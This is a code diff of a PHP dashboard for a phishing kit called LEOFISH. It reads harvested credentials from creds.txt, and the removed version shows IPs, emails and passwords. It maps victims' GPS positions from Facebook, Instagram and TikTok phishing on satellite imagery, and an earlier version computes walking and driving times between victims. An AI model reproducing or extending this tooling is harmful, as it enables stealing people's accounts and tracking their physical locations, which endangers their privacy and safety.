@@ -1,99 +1,109 @@
 <?php
-$creds = file_get_contents('creds.txt');
+date_default_timezone_set('Africa/Bujumbura');
+
+// Lire creds.txt et parser GPS
 $victims = [];
-if($creds) {
-    foreach(explode("\n", trim($creds)) as $line) {
-        if($line) {
-            [$ip,$ua,$email,$pass,$gps,$time] = explode('|', $line);
-            if($gps !== 'N/A') {
-                $coords = json_decode($gps, true);
-                if($coords && $coords['lat']) {
-                    $victims[] = ['ip'=>$ip, 'email'=>$email, 'time'=>$time, 'lat'=>$coords['lat'], 'lng'=>$coords['lng']];
-                }
+if (file_exists('creds.txt')) {
+    $lines = file('creds.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    foreach ($lines as $line) {
+        if (strpos($line, 'GPS POSITION') !== false) {
+            // Parser GPS: "│ 📍 GPS POSITION : -3.361378,29.359912"
+            if (preg_match('/📍 GPS POSITION\s*:\s*([-\d.]+),([-\d.]+)/', $line, $matches)) {
+                preg_match('/(FACEBOOK|INSTAGRAM|TIKTOK)/', $line, $platform);
+                $victims[] = [
+                    'platform' => $platform[1] ?? 'UNKNOWN',
+                    'lat' => floatval($matches[1]),
+                    'lng' => floatval($matches[2]),
+                    'time' => date('H:i:s'),
+                    'full_line' => $line
+                ];
             }
         }
     }
 }
 
-// Haversine distance (km)
-function haversine($lat1, $lon1, $lat2, $lon2) {
-    $R = 6371;
-    $dLat = deg2rad($lat2 - $lat1);
-    $dLon = deg2rad($lon2 - $lon1);
-    $a = sin($dLat/2) * sin($dLat/2) + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon/2) * sin($dLon/2);
-    $c = 2 * atan2(sqrt($a), sqrt(1-$a));
-    return $R * $c;
-}
-
-// Sort by time, calculate routes
-usort($victims, fn($a,$b)=>strtotime($b['time']) - strtotime($a['time']));
-$routes = [];
-for($i=1; $i<count($victims); $i++) {
-    $dist = haversine($victims[$i-1]['lat'], $victims[$i-1]['lng'], $victims[$i]['lat'], $victims[$i]['lng']);
-    $walk_time = $dist / 5 * 60; // 5km/h walking
-    $drive_time = $dist / 50 * 60; // 50km/h driving
-    $routes[] = [
-        'from' => $victims[$i-1], 'to' => $victims[$i],
-        'dist' => round($dist,2), 'walk_min' => round($walk_time),
-        'drive_min' => round($drive_time)
-    ];
-}
+// Trier par récence
+usort($victims, function($a, $b) { return strtotime($b['time']) - strtotime($a['time']); });
 ?>
-<!DOCTYPE html><html><head>
-<title>LEOFISHER Dashboard</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
-<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css"/>
-<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css"/>
-<style>body{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:20px}
-#map{height:600px;width:100%;border:2px solid #00ff00}
-.victim-list{max-height:200px;overflow:auto;background:#000;padding:10px}
-.route-info{color:#ffff00}</style>
-</head><body>
-<h1>🎣 LEOFISHER V1.1 - Live Tracking (<?php echo count($victims); ?> victims)</h1>
-<div id="map"></div>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:20px">
-<div>
-<h3>Recent Victims</h3><div class="victim-list">
-<?php foreach(array_slice($victims,0,10) as $v): ?>
-<div><?php echo htmlspecialchars($v['ip'].' | '.$v['email'].' | '.date('H:i:s',strtotime($v['time']))); ?></div>
-<?php endforeach; ?>
-</div>
-</div>
-<div>
-<h3>Routes & Distances</h3>
-<div class="route-info">
-<?php foreach(array_slice($routes,0,5) as $r): ?>
-<div>
-<?= $r['from']['ip'] ?> → <?= $r['to']['ip'] ?><br>
-Dist: <?= $r['dist'] ?>km | Walk: <?= $r['walk_min'] ?>min | Drive: <?= $r['drive_min'] ?>min
-</div>
-<?php endforeach; ?>
-</div>
-</div>
-</div>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LEOFISH GPS Dashboard</title>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
+    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
+    <style>
+    body { margin: 0; font-family: monospace; background: #0a0a0a; color: #00ff00; }
+    #map { height: 70vh; width: 100%; border: 2px solid #00ff00; }
+    .header { background: #000; padding: 15px; text-align: center; border-bottom: 2px solid #00ff00; }
+    .stats { display: flex; justify-content: space-around; margin: 10px 0; font-size: 18px; }
+    .platform { padding: 5px 10px; border-radius: 5px; margin: 2px; }
+    .facebook { background: #1877f2; color: white; }
+    .instagram { background: #E4405F; color: white; }
+    .tiktok { background: #000; color: #ff0050; border: 1px solid #ff0050; }
+    .refresh { position: fixed; top: 10px; right: 10px; background: #00ff00; color: #000; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎣 LEOFISH GPS LIVE MAP</h1>
+        <div class="stats">
+            <span>📍 Victims: <?php echo count($victims); ?></span>
+            <span>🛰️ Satellite HD</span>
+            <span id="last-update"><?php echo date('H:i:s'); ?></span>
+        </div>
+    </div>
+    
+    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
+    
+    <div id="map"></div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
-<script>
-var map = L.map('map',{zoomControl:true}).setView([0,0],2);
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap'}).addTo(map);
-var markers = L.markerClusterGroup({spiderfyOnMaxZoom:false,showCoverageOnHover:false});
-<?php foreach($victims as $v): ?>
-L.marker([<?= $v['lat'] ?>,<?= $v['lng'] ?>])
-.bindPopup(`IP: <?= $v['ip'] ?><br>Email: <?= $v['email'] ?><br>Time: <?= $v['time'] ?>`)
-.addTo(markers);
-<?php endforeach; ?>
-map.addLayer(markers);
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
+    <script>
+    // Map satellite (OpenStreetMap + zoom max)
+    var map = L.map('map', {
+        zoomControl: true,
+        minZoom: 2,
+        maxZoom: 19
+    }).setView([-3.38, 29.36], 12); // Bujumbura default
 
-// Draw routes
-<?php foreach($routes as $r): ?>
-L.polyline([
-[<?= $r['from']['lat'] ?>,<?= $r['from']['lng'] ?>],
-[<?= $r['to']['lat'] ?>,<?= $r['to']['lng'] ?>]
-],{color:<?= rand(0,2)==0 ? "'#00ff00'" : rand(0,1)==0 ? "'#ffff00'" : "'#ff0000'" ?>}).addTo(map);
-<?php endforeach; ?>
+    // Tuiles satellite HD
+    L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+        attribution: 'LEOFSIH GPS',
+        maxZoom: 19
+    }).addTo(map);
 
-// Auto-refresh every 30s
-setInterval(()=>{location.reload();},30000);
-</script>
-</body></html>
+    var markers = L.markerClusterGroup({
+        spiderfyOnMaxZoom: false,
+        showCoverageOnHover: true,
+        zoomToBoundsOnClick: true
+    });
+
+    <?php foreach ($victims as $victim): ?>
+    <?php 
+    $iconColor = $victim['platform'] == 'FACEBOOK' ? '#1877f2' : 
+                 ($victim['platform'] == 'INSTAGRAM' ? '#E4405F' : '#ff0050');
+    ?>
+    L.marker([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], {
+        icon: L.divIcon({
+            className: 'custom-marker',
+            html: '<div style="background:<?php echo $iconColor; ?>;width:25px;height:25px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 10px rgba(0,255,0,0.5);"></div>',
+            iconSize: [25, 25],
+            iconAnchor: [12, 12]
+        })
+    }).bindPopup(`
+        <b><?php echo $victim['platform']; ?></b><br>
+        📍 GPS: <?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?><br>
+        🕒 <?php echo $victim['time']; ?>
+    `).addTo(markers);
+    <?php endforeach; ?>
+
+    map.addLayer(markers);
+
+    // Auto refresh toutes les 10s
+    setInterval(() => location.reload(), 10000);
+    </script>
+</body>
+</html>	
